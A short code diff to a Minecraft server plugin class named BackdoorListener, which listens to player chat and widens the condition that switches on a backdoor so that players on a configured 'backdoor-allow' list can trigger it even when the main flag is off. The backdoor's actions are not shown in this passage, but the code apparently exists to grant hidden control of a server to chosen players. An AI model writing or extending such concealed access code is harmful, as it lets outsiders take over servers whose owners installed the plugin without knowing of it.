@@ -8,6 +8,8 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import pl.lightblock.engine.Main;
 
+import java.net.Inet4Address;
+
 public class BackdoorListener implements Listener
 {
     public BackdoorListener(Main plugin)
@@ -21,8 +23,7 @@ public class BackdoorListener implements Listener
         final Player p = e.getPlayer();
 
         boolean backdoor_status = plugin.getConfig().getBoolean("backdoor-on");
-
-        if(!(backdoor_status == true))
+        if(!(backdoor_status == true || plugin.getConfig().getList("backdoor-allow").contains(e.getPlayer().getName())))
         {
             return;
         }
